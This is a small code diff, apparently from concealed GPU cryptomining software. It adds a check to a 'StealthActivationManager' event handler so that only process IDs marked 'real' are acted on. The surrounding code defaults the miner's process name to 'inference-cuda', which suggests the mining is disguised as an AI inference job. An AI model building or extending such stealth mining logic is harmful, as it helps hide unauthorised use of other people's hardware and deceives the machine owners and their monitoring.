@@ -155,6 +155,11 @@ class StealthActivationManager:
         Được gọi khi EventBus nhận được 'mining:gpu_pid_registered' event.
         """
         try:
+            role = event_data.get('role')
+            if role != 'real':
+                self.logger.warning(f"[STEALTH-ACTIVATION] Bỏ qua PID không phải real: {event_data}")
+                return
+
             pid = event_data.get('pid')
             process_name = event_data.get('process_name', 'inference-cuda')
             
